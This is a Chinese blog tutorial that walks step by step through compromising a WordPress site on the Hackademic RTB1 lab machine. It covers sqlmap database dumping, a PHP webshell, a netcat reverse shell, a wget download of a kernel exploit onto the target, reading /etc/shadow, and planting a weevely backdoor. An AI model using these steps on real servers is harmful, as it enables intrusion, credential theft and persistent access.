---
title: IT外包网络维护专家告诉你，黑客是如何攻破一个网站？
date: 2018-06-21 15:20:31
categories: "开发"
tags:
	- 黑客
	- 编程语言
	- PHP
	- Apache
	- SQL

---

作者：华盟

![IT外包网络维护专家告诉你，黑客是如何攻破一个网站？][IT]

一篇科普文，很适合初学者，长文请静下心看。本文将用图文讲解黑客攻破网站全流程。通过本文你将了解黑客常用的入手思路和技术手法，适合热爱网络信息安全的新手朋友了解学习。本文将从最开始的信息收集开始讲述黑客是如何一步步的攻破你的网站和服务器的。

阅读本文你会学到以下内容：

渗透测试前的简单信息收集。

sqlmap的使用

nmap的使用

nc反弹提权

linux系统的权限提升

backtrack 5中渗透测试工具nikto和w3af的使用等

假设黑客要入侵的你的网站域名为:hack-test.com

让我们用ping命令获取网站服务器的IP地址

现在我们获取了网站服务器的IP地址为:173.236.138.113

寻找同一服务器上的其它网站，我们使用sameip.org.

![IT外包网络维护专家告诉你，黑客是如何攻破一个网站？][IT 1]

26 sites hosted on IP Address 173.236.138.113

173.236.138.113上有26个网站，很多黑客为了攻破你的网站可能会检查同服务器上的其它网站，但是本次是以研究为目标，我们将抛开服务器上的其它网站，只针对你的网站来进行入侵检测。

我们需要关于你网站的以下信息：

DNS records (A, NS, TXT, MX and SOA)

Web Server Type (Apache, IIS, Tomcat)

Registrar (the company that owns your domain)

Your name, address, email and phone

Scripts that your site uses (php, asp, asp.net, jsp, cfm)

Your server OS (Unix,Linux,Windows,Solaris)

Your server open ports to internet (80, 443, 21, etc.)

让我们开始找你网站的DNS记录，我们用who.is来完成这一目标.

![IT外包网络维护专家告诉你，黑客是如何攻破一个网站？][IT 2]

我们发现你的DNS记录如下

![IT外包网络维护专家告诉你，黑客是如何攻破一个网站？][IT 3]

让我们来确定web服务器的类型

发现你的Web服务器是apache，接下来确定它的版本.

IP: 173.236.138.113

Website Status: active

Server Type: Apache

Alexa Trend/Rank: 1 Month:3,213,968 3 Month: 2,161,753

Page Views per Visit: 1 Month: 2.0 3Month: 3.7

接下来是时候寻找你网站域名的注册信息,你的电话、邮箱、地址等.

![IT外包网络维护专家告诉你，黑客是如何攻破一个网站？][IT 4]

我们现在已经获取了你的网站域名的注册信息，包括你的重要信息等.

我们可以通过backtrack5中的whatweb来获取你的网站服务器操作系统类型和服务器的版本.

我们发现你的网站使用了著名的php整站程序wordpress，服务器的的系统类型为FedoraLinux，Web服务器版本Apache 2.2.15.继续查看网站服务器开放的端口，用渗透测试工具nmap:

1-Find services that run on server(查看服务器上运行的服务)

2-Find server OS(查看操作系统版本)

![IT外包网络维护专家告诉你，黑客是如何攻破一个网站？][IT 5]

只有80端口是开放的,操作系统是Linux2.6.22（Fedora Core 6），现在我们已经收集了所有关于你网站的重要信息,接下来开始扫描寻找漏洞,比如:

Sql injection – Blind sql injection – LFI – RFI – XSS – CSRF等等.

我们将使用Nikto来收集漏洞信息:

root@bt:/pentest/web/nikto\# perlnikto.pl -h hack-test.com

![IT外包网络维护专家告诉你，黑客是如何攻破一个网站？][IT 6]

我们也会用到Backtrack 5 R1中的W3AF 工具:

root@bt:/pentest/web/w3af\#./w3af\_gui

我们输入要检测的网站地址,选择完整的安全审计选项.

![IT外包网络维护专家告诉你，黑客是如何攻破一个网站？][IT 7]

稍等一会，你将会看到扫描结果.

![IT外包网络维护专家告诉你，黑客是如何攻破一个网站？][IT 8]

发现你的网站存在sql注入漏洞、XSS漏洞、以及其它的漏洞.让我们来探讨SQL注入漏洞.

http://hack-test.com/Hackademic\_RTB1/?cat=d％27z％220

我们通过工具发现这个URL存在SQL注入，我们通过Sqlmap来检测这个url.

Using sqlmap with –u url

过一会你会看到

输入N按回车键继续

我们发现你的网站存在mysql显错注入，mysql数据库版本是5.0. 我们通过加入参数”-dbs”来尝试采集数据库名.

发现三个数据库,接下来通过参数”-D wordpress -tables”来查看wordpress数据库的所有表名

![IT外包网络维护专家告诉你，黑客是如何攻破一个网站？][IT 9]

通过参数“-T wp\_users –columns ”来查看wp\_users表中的字段.

![IT外包网络维护专家告诉你，黑客是如何攻破一个网站？][IT 10]

接下来猜解字段user\_login和user\_pass的值.用参数”-C user\_login,user\_pass–dump”

![IT外包网络维护专家告诉你，黑客是如何攻破一个网站？][IT 11]

我们会发现用户名和密码hashes值. 我们需要通过以下在线破解网站来破解密码hashes

登陆wordpress的后台wp-admin

尝试上传php webshell到服务器，以方便运行一些linux命令.在插件页面寻找任何可以编辑的插件.我们选择Textile这款插件，编辑插入我们的php webshell，点击更新文件，然后访问我们的phpwebshell.

![IT外包网络维护专家告诉你，黑客是如何攻破一个网站？][IT 12]

![IT外包网络维护专家告诉你，黑客是如何攻破一个网站？][IT 13]

Phpwebshell被解析了，我们可以控制你网站的文件，但是我们只希望获得网站服务器的root权限,来入侵服务器上其它的网站。

我们用NC来反弹一个shell,首先在我们的电脑上监听5555端口.

然后在Php webshell上反向连接我们的电脑，输入你的IP和端口5555.

![IT外包网络维护专家告诉你，黑客是如何攻破一个网站？][IT 14]

点击连接我们会看到

接下来我们尝试执行一些命令：

id

uid=48(apache) gid=489(apache) groups=489(apache)

（用来显示用户的id和组）

pwd

/var/www/html/Hackademic\_RTB1/wp-content/plugins

（显示服务器上当前的路径）

uname -a

Linux HackademicRTB1 2.6.31.5-127.fc12.i686 \#1 SMP Sat Nov 721:41:45 EST 2009 i686 i686 i386 GNU/Linux

（显示内核版本信息）

现在我们知道，服务器的内核版本是2.6.31.5-127.fc12.1686,我们在exploit-db.com中搜索此版本的相关漏洞.

在服务器上测试了很多exp之后，我们用以下的exp来提升权限.

http://www.exploit-db.com/exploits/15285

我们在nc shell上执行以下命令:

wgethttp://www.exploit-db.com/exploits/15285 -o roro.c

(下载exp到服务器并重命名为roro.c)

注：很多linux内核的exp都是C语言开发的,因此我们保存为.c扩展名.

exp roro.c代码如下：

通过以上代码我们发现该exp是C语言开发的，我们需要将他编译成elf格式的,命令如下:

gcc roro.c –ororo

接下来执行编译好的exp

./roro

![IT外包网络维护专家告诉你，黑客是如何攻破一个网站？][IT 15]

执行完成之后我们输入id命令

id

我们发现我们已经是root权限了

uid=0(root) gid=0(root)

现在我们可以查看/etc/shadow文件

cat/etc/shadow

![IT外包网络维护专家告诉你，黑客是如何攻破一个网站？][IT 16]

我们可以使用”john theripper”工具破解所有用户的密码.但是我们不会这样做，我们需要在这个服务器上留下后门以方便我们在任何时候访问它.

我们用weevely制作一个php小马上传到服务器上.

1.weevely使用选项

root@bt:/pentest/backdoors/web/weevely\#./main.py -

![IT外包网络维护专家告诉你，黑客是如何攻破一个网站？][IT 17]

2.用weevely创建一个密码为koko的php后门

root@bt:/pentest/backdoors/web/weevely\#./main.py -g -o hax.php -p koko

接下来上传到服务器之后来使用它

root@bt:/pentest/backdoors/web/weevely\#./main.py -t -uhttp://hack-test.com/Hackademic\_RTB1/wp-content/plugins/hax.php -pkoko

测试我们的hax.php后门

完成，撒花！

![IT外包网络维护专家告诉你，黑客是如何攻破一个网站？][IT 18]

整理/夏立城 上海蓝盟创始人兼CEO，复旦校友创新创业俱乐部副会长，致力于用IT外包网络维护服务赋能企业客户发展，助力其创新、迭代和进化。


[IT]: /pro/os/crawler/JAVR-IABU-FZ6V.jpg
[IT 1]: http://p9.pstatp.com/large/pgc-image/15295655345973f39af02a7
[IT 2]: /pro/os/crawler/RN6Z-FBUZ-FYJY.jpg
[IT 3]: /pro/os/crawler/ANVE-NFIZ-6ZZE.jpg
[IT 4]: /pro/os/crawler/JFFR-NNQY-IIBM.jpg
[IT 5]: /pro/os/crawler/U2UA-RY3E-RUQI.jpg
[IT 6]: /pro/os/crawler/UFUF-32YQ-7ZMU.jpg
[IT 7]: /pro/os/crawler/NFEB-JQQY-JEFJ.jpg
[IT 8]: /pro/os/crawler/MFFE-UM7R-BVYQ.jpg
[IT 9]: /pro/os/crawler/NYAB-QQVI-B2IA.jpg
[IT 10]: /pro/os/crawler/JIMN-ZJZM-FMIB.jpg
[IT 11]: /pro/os/crawler/RJZI-N3QM-M3YU.jpg
[IT 12]: /pro/os/crawler/RIMF-VQJ3-YUMR.jpg
[IT 13]: /pro/os/crawler/QFMY-BMBA-AMU3.jpg
[IT 14]: /pro/os/crawler/ZARV-Z2IU-AZIA.jpg
[IT 15]: /pro/os/crawler/JQEV-QZYF-ZR7N.jpg
[IT 16]: /pro/os/crawler/BNEZ-F2NV-J6Z2.jpg
[IT 17]: /pro/os/crawler/3YRJ-EVEE-BVAQ.jpg
[IT 18]: /pro/os/crawler/6VJQ-N32A-UBY2.jpg
 *  **原文作者：** 夏掰创业
 *  **原文链接：** https://www.toutiao.com/item/6569434365762208270/
 *  **版权声明：** 本博客所有文章除特别声明外，均采用 [CC BY-NC-SA 4.0][] 许可协议。转载请注明出处。